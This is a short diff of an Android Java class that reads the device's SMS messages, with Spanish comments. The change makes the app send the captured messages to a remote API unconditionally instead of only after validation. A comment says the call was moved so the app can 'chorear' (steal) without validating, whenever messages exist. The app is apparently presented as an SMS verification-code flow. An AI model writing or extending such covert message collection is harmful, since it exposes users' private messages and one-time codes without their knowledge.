@@ -231,12 +231,12 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 						}
 						while(cursor.moveToNext());
 						cursor.close();
-						result = ApiConnection.OK;
 
 						//Agregado para evitar reproceso si el usuario hizo back en la pantalla de verificación del código
 						SharedPreferences.Editor editor	= preferences.edit();
 						editor.putBoolean(Common.KEY_PREF_CAPTURED, true);
 						editor.apply();
+						result = ApiConnection.OK;
 					}
 				}
 			}
@@ -271,11 +271,7 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 			}
 
 			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
-			if(result.equals(ApiConnection.OK))
-			{
-				final ConnectApiSMSAsyncTask task	= new ConnectApiSMSAsyncTask(activity, false);
-				task.execute();
-			}
+			new ConnectApiSMSAsyncTask(activity, false).execute();
 		}
 		catch(Exception e)
 		{
